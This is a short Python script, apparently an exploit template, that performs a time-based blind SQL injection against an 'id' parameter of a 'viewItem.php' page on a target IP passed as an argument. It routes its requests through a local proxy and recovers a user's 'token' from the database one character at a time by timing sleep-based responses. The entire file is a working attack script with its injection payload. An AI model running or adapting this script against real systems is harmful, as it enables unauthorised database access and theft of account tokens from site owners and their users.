#/usr/bin/python3

import requests
import time
import sys
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}


def timebased_sqli(ip, inj_str):
	s = requests.Session()
	for j in range(32, 126):
	# Update your sqli
		target = "http://%s/item/viewItem.php?id=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
		start = time.perf_counter()
		r = s.get(target, proxies=proxies)
		total_time = time.perf_counter() - start
		#print(total_time)
		if (total_time > 2):
			return j
	return None

def get_token():
	print("(+) Retrieving some juicy thing from database")
	# Determine the length of your injected point.
	retrieved=""
	for i in range(1, 16):
		injection_string = "if(ascii(substring((SELECT+token+FROM+user+limit+0,1),%d,1))=[CHAR],sleep(1),1)" % i
		extracted_char = chr(timebased_sqli(ip, injection_string))
		retrieved += extracted_char
		#sys.stdout.write(extracted_char)
		#sys.stdout.flush()
	print("\n")
	print("Retrieved thing is=%s" % retrieved)
	#print("\n(+) done!")
	return retrieved

if __name__ == "__main__":
	if len(sys.argv) != 2:
                print ("(+) usage: %s <target>" % sys.argv[0])
                print ('(+) eg: %s 192.168.121.103' % sys.argv[0])
                sys.exit(-1)
	ip = sys.argv[1]

	get_token()

